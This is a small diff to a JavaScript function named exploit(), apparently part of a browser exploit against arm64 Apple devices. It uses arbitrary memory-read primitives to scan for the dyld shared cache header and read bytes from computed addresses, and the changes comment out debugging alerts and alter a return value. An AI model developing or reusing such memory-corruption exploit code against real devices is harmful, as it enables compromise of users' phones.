@@ -570,7 +570,7 @@ function exploit(){
         //}
         if(strcmp(memory.read(hdr, 0x10), "dyld_v1   arm64"))
         {
-            alert(memory.read(hdr, 0x10)[0]))
+            //alert(memory.read(hdr, 0x10)[0]))
             break;
         }
         hdr = Sub(hdr, 0x1000);
@@ -693,8 +693,8 @@ function exploit(){
             {
                 var g = memory.read(Add(straddr, i), 1);
                 alert(g)
-                alert(g[0])
-                return g[0];
+                //alert(g[0])
+                return g;
 
 
             };
